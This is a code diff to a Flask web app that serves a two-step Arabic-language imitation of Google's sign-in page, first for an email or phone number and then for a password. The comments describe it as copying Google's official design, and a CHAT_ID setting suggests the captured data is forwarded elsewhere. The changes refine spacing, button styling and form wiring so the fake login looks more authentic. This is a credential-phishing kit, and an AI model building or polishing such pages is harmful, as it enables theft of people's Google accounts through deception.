@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: مطابقة تماماً لتصميم صفحة جوجل الرسمية
+# الصفحة الأولى: مطابقة تماماً للصورة الثانية من حيث الترتيب والتصميم
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -52,33 +52,32 @@ def step1():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
-            padding: 24px 16px;
+            padding: 20px 16px;
         }
         
         .login-container {
             width: 100%;
-            max-width: 450px;
+            max-width: 400px;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-            margin: auto;
         }
 
         .google-g {
-            width: 48px;
-            height: 48px;
-            margin-bottom: 12px;
+            width: 40px;
+            height: 40px;
+            margin-bottom: 8px;
         }
 
-        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
-        .subtitle { font-size: 14.5px; color: #5f6368; margin-bottom: 6px; line-height: 1.5; }
+        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
+        .subtitle { font-size: 13.5px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
         
         .info-link {
-            font-size: 14px;
+            font-size: 13.5px;
             color: #1a73e8;
             text-decoration: none;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
             display: inline-block;
         }
         .info-link:hover { text-decoration: underline; }
@@ -87,11 +86,11 @@ def step1():
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 15px; 
+            margin-bottom: 12px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
-            padding: 12px; 
+            padding: 10px; 
             border-radius: 8px; 
             border: 1px solid #fad2cf; 
         }
@@ -99,7 +98,7 @@ def step1():
         .input-group { width: 100%; margin-bottom: 10px; }
         .input-group input {
             width: 100%;
-            padding: 16px 14px;
+            padding: 14px 14px;
             font-size: 16px;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -107,7 +106,7 @@ def step1():
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 13px; }
 
         .links-container {
             width: 100%;
@@ -115,7 +114,6 @@ def step1():
             flex-direction: column;
             align-items: flex-start;
             gap: 12px;
-            margin-bottom: 30px;
             padding: 0 2px;
         }
         .links-container a {
@@ -128,10 +126,11 @@ def step1():
 
         .footer-action {
             width: 100%;
-            max-width: 450px;
+            max-width: 400px;
             display: flex;
             justify-content: flex-end;
             align-items: center;
+            padding-bottom: 10px;
         }
 
         .submit-btn {
@@ -139,12 +138,13 @@ def step1():
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 10px 28px;
+            padding: 12px 32px;
             font-size: 15px;
             font-weight: 500;
             cursor: pointer;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
-        .submit-btn:hover { background: #1558b0; }
+        .submit-btn:hover { background: #1558b0; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
     </style>
 </head>
 <body>
@@ -164,20 +164,20 @@ def step1():
             <div class="error-msg">{{ error }}</div>
         {% endif %}
 
-        <form method="POST" style="width: 100%;">
+        <form id="emailForm" method="POST" style="width: 100%;">
             <div class="input-group">
                 <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
             </div>
             
             <div class="links-container">
-                <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
                 <a href="#">هل نسيت بريدك الإلكتروني؟</a>
+                <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
             </div>
         </form>
     </div>
 
     <div class="footer-action">
-        <button type="submit" form="emailForm" class="submit-btn" onclick="document.querySelector('form').submit();">التالي</button>
+        <button type="submit" form="emailForm" class="submit-btn">التالي</button>
     </div>
 </body>
 </html>
@@ -186,7 +186,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور مع تثبيت الواجهة بدون تمرير
+# الصفحة الثانية: إدخال كلمة المرور مع الحفاظ على نفس التنسيق والثبات
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -230,24 +230,23 @@ def step2():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
-            padding: 24px 16px;
+            padding: 20px 16px;
         }
         
         .login-container {
             width: 100%;
-            max-width: 450px;
+            max-width: 400px;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-            margin: auto;
         }
 
         .google-logo {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 500;
             color: #202124;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -261,7 +260,7 @@ def step2():
         .google-logo span span:nth-child(5) { color: #34A853; }
         .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 12px; }
+        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
         
         .user-chip {
             display: inline-flex;
@@ -269,23 +268,23 @@ def step2():
             padding: 4px 12px 4px 4px;
             border: 1px solid #dadce0;
             border-radius: 100px;
-            margin-bottom: 24px;
-            font-size: 14px;
+            margin-bottom: 20px;
+            font-size: 13.5px;
             color: #3c4043;
             gap: 8px;
             background: #fff;
         }
-        .user-chip svg { width: 20px; height: 20px; }
+        .user-chip svg { width: 18px; height: 18px; }
 
         .error-msg { 
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 15px; 
+            margin-bottom: 12px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
-            padding: 12px; 
+            padding: 10px; 
             border-radius: 8px; 
             border: 1px solid #fad2cf; 
         }
@@ -293,7 +292,7 @@ def step2():
         .input-group { width: 100%; margin-bottom: 15px; }
         .input-group input {
             width: 100%;
-            padding: 16px 14px;
+            padding: 14px 14px;
             font-size: 16px;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -301,14 +300,15 @@ def step2():
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 13px; }
 
         .footer-action {
             width: 100%;
-            max-width: 450px;
+            max-width: 400px;
             display: flex;
             justify-content: flex-end;
             align-items: center;
+            padding-bottom: 10px;
         }
 
         .submit-btn {
@@ -316,12 +316,13 @@ def step2():
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 10px 28px;
+            padding: 12px 32px;
             font-size: 15px;
             font-weight: 500;
             cursor: pointer;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
-        .submit-btn:hover { background: #1558b0; }
+        .submit-btn:hover { background: #1558b0; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
     </style>
 </head>
 <body>
@@ -343,7 +344,7 @@ def step2():
             <div class="error-msg">{{ error }}</div>
         {% endif %}
 
-        <form method="POST" style="width: 100%;">
+        <form id="passForm" method="POST" style="width: 100%;">
             <div class="input-group">
                 <input type="password" name="password" required placeholder="إدخال كلمة المرور">
             </div>
@@ -351,7 +352,7 @@ def step2():
     </div>
 
     <div class="footer-action">
-        <button type="submit" form="passForm" class="submit-btn" onclick="document.querySelector('form').submit();">التالي</button>
+        <button type="submit" form="passForm" class="submit-btn">التالي</button>
     </div>
 </body>
 </html>
